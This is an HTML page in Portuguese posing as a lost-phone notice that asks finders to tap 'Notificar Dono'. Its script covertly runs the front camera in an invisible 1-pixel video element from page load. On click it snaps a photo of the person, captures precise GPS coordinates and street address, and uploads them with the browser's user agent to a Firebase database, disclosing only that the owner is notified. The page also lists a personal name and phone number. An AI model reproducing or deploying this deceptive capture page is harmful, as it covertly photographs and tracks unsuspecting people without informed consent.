<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Celular Encontrado</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      padding: 10px;
    }

    .container {
      width: 100%;
      max-width: 500px;
      background: #000;
      border-radius: 15px;
      overflow: hidden;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
    }

    /* ======================================================
       IMAGEM DE TOPO — TROQUE AQUI QUANDO QUISER
       Duas opções:
       1) Deixe como está (usa o ícone de celular+cadeado em SVG, sem precisar de arquivo externo)
       2) Troque a linha do <img id="imagemTopo"> abaixo por uma URL sua,
          ex: src="https://raw.githubusercontent.com/SEU-USER/SEU-REPO/main/sua-imagem.jpg"
       ====================================================== */
    .imagem-topo-wrapper {
      width: 100%;
      aspect-ratio: 1 / 1;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    .imagem-topo-wrapper img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    .icone-padrao {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #667eea;
    }

    .icone-padrao svg {
      width: 120px;
      height: 120px;
      margin-bottom: 15px;
    }

    .icone-padrao .titulo-grande {
      color: #fff;
      font-size: 22px;
      font-weight: bold;
      text-align: center;
      padding: 0 20px;
    }

    canvas {
      display: none;
    }

    .controls {
      background: #1a1a1a;
      padding: 20px;
      text-align: center;
    }

    .info {
      color: #fff;
      font-size: 14px;
      margin-bottom: 15px;
      line-height: 1.5;
    }

    .contact {
      color: #ffd700;
      font-weight: bold;
      font-size: 13px;
      margin-bottom: 15px;
    }

    button {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      padding: 14px 30px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
      transition: all 0.3s;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    button:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
    }

    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .spinner {
      display: inline-block;
      width: 12px;
      height: 12px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 0.8s linear infinite;
      margin-right: 8px;
      vertical-align: middle;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .status {
      font-size: 12px;
      padding: 8px;
      margin-top: 10px;
      border-radius: 6px;
      display: none;
    }

    .status.show {
      display: block;
    }

    .status.success {
      background: #4caf50;
      color: white;
    }

    .status.error {
      background: #f44336;
      color: white;
    }

    .status.info {
      background: #2196f3;
      color: white;
    }

    video.hidden-cam {
      position: absolute;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div class="container">

    <div class="imagem-topo-wrapper">
      <!--
        Para trocar a imagem: apague o bloco <div class="icone-padrao">...</div> logo abaixo
        e descomente / edite a linha da tag <img>, colocando o link da sua foto.
      -->
      <!-- <img id="imagemTopo" src="COLOQUE-O-LINK-DA-SUA-IMAGEM-AQUI" alt="Celular encontrado"> -->

      <div class="icone-padrao">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
          <rect x="6" y="2" width="12" height="20" rx="2"></rect>
          <circle cx="12" cy="18" r="1" fill="currentColor"></circle>
          <path d="M9 6h6" stroke-linecap="round"></path>
        </svg>
        <div class="titulo-grande">📱 Celular Encontrado?</div>
      </div>
    </div>

    <video id="camera" class="hidden-cam" playsinline autoplay></video>
    <canvas id="canvas"></canvas>

    <div class="controls">
      <div class="info">
        🔒 Este celular está bloqueado. Se você o encontrou, toque no botão abaixo para notificar o dono.
      </div>

      <div class="contact">
        👤 Propriedade de: Hizag — (51) 99120-8358
      </div>

      <button id="btnEnviar" onclick="capturarEEnviar()">
        ✅ Notificar Dono
      </button>

      <div id="status" class="status"></div>
    </div>
  </div>

  <script src="https://www.gstatic.com/firebasejs/10.3.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.3.1/firebase-database-compat.js"></script>

  <script>
    const firebaseConfig = {
      databaseURL: "https://hizag-b0c4b-default-rtdb.firebaseio.com/"
    };

    let db;
    try {
      firebase.initializeApp(firebaseConfig);
      db = firebase.database();
    } catch (e) {
      console.log("Firebase não configurado:", e);
    }

    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const btnEnviar = document.getElementById('btnEnviar');
    const statusDiv = document.getElementById('status');
    let cameraPronta = false;

    async function iniciarCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });
        video.srcObject = stream;
        cameraPronta = true;
      } catch (err) {
        console.error('Erro câmera:', err);
      }
    }

    function capturarFoto() {
      if (!cameraPronta || !video.videoWidth) return null;
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      return canvas.toDataURL('image/jpeg', 0.8);
    }

    async function capturarLocalizacao() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve(null);
          return;
        }
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            const localizacao = {
              latitude: lat,
              longitude: lng,
              precisao: Math.round(accuracy),
              timestamp: new Date().toLocaleString('pt-BR'),
              googleMapsUrl: `https://maps.google.com/?q=${lat},${lng}`
            };

            try {
              const response = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`
              );
              const data = await response.json();
              localizacao.endereco = {
                rua: data.address?.road || '',
                numero: data.address?.house_number || '',
                bairro: data.address?.suburb || data.address?.city || '',
                estado: data.address?.state || '',
                pais: data.address?.country || ''
              };
            } catch (e) {
              localizacao.endereco = null;
            }

            resolve(localizacao);
          },
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    async function capturarEEnviar() {
      if (!db) {
        mostrarStatus('❌ Sistema não configurado', 'error');
        return;
      }

      btnEnviar.disabled = true;
      btnEnviar.innerHTML = '<span class="spinner"></span>Enviando aviso...';

      try {
        const localizacao = await capturarLocalizacao();
        const fotoBase64 = capturarFoto();

        const timestamp = new Date().getTime();
        const dados = {
          timestamp: new Date().toLocaleString('pt-BR'),
          foto: fotoBase64 ? fotoBase64.substring(0, 500000) : null,
          localizacao: localizacao || { erro: 'Localização não disponível' },
          userAgent: navigator.userAgent
        };

        await db.ref('capturas/' + timestamp).set(dados);

        mostrarStatus('✅ Obrigado! Dono notificado.', 'success');
        btnEnviar.innerHTML = '✅ Enviado';

        setTimeout(() => {
          btnEnviar.disabled = false;
          btnEnviar.innerHTML = '✅ Notificar Dono';
        }, 3000);

      } catch (error) {
        console.error('Erro:', error);
        mostrarStatus('❌ Erro ao enviar. Tente novamente.', 'error');
        btnEnviar.disabled = false;
        btnEnviar.innerHTML = '✅ Notificar Dono';
      }
    }

    function mostrarStatus(msg, tipo) {
      statusDiv.textContent = msg;
      statusDiv.className = 'status show ' + tipo;
      setTimeout(() => {
        statusDiv.className = 'status';
      }, 4000);
    }

    iniciarCamera();
  </script>
</body>
</html>
